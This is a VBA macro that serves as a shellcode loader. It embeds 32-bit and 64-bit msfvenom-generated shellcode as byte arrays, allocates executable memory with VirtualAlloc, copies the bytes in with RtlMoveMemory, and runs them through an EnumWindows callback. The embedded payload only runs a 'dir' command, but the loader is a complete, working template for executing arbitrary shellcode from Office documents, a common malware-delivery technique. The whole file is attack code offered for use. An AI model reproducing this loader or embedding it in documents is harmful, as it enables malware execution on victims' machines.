Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function EnumWindows Lib "user32" (ByVal lpEnumFunc As LongPtr, ByVal lParam As LongPtr) As Long

Sub A()
    
    ' msfvenom -p windows/exec CMD="cmd.exe /c dir && pause" EXITFUNC="thread"
    shellcode32 = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, _
207, 13, 1, 199, 56, 224, 117, 246, 3, 125, 248, 59, 125, 36, 117, 228, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 95, 95, 90, 139, 18, 235, 141, 93, 106, 1, 141, 133, 178, 0, 0, 0, 80, 104, 49, 139, 111, 135, 255, 213, 187, 224, 29, 42, 10, 104, 166, 149, _
189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213, 99, 109, 100, 46, 101, 120, 101, 32, 47, 99, 32, 100, 105, 114, 32, 38, 38, 32, 112, 97, 117, 115, 101, 0)

    ' msfvenom -p windows/x64/exec CMD="cmd.exe /c dir && pause" EXITFUNC="thread"
    shellcode64 = Array(72, 131, 228, 240, 232, 192, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, 72, 139, 114, 80, 72, 15, 183, 74, 74, 77, 49, 201, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 139, 128, 136, 0, _
0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 80, 139, 72, 24, 68, 139, 64, 32, 73, 1, 208, 227, 86, 72, 255, 201, 65, 139, 52, 136, 72, 1, 214, 77, 49, 201, 72, 49, 192, 172, 65, 193, 201, 13, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, 208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, _
208, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 87, 255, 255, 255, 93, 72, 186, 1, 0, 0, 0, 0, 0, 0, 0, 72, 141, 141, 1, 1, 0, 0, 65, 186, 49, 139, 111, 135, 255, 213, 187, 224, 29, 42, 10, 65, 186, 166, 149, 189, 157, 255, 213, _
72, 131, 196, 40, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 89, 65, 137, 218, 255, 213, 99, 109, 100, 46, 101, 120, 101, 32, 47, 99, 32, 100, 105, 114, 32, 38, 38, 32, 112, 97, 117, 115, 101, 0)
 
    #If Win64 Then
        shellcode = shellcode64
    #Else
        shellcode = shellcode32
    #End If
    
    shellcodeLen = UBound(shellcode) - LBound(shellcode) + 0
    
    Dim executableMemory As LongPtr
    executableMemory = VirtualAlloc(0&, shellcodeLen, &H1000, &H40) ' MEM_COMMIT, PAGE_EXECUTE_READWRITE
    
    For i = LBound(shellcode) To UBound(shellcode)
        Dim b As Long
        b = shellcode(i)
        
        RtlMoveMemory executableMemory + i, b, 1
    Next i
    
    EnumWindows executableMemory, 0
End Sub
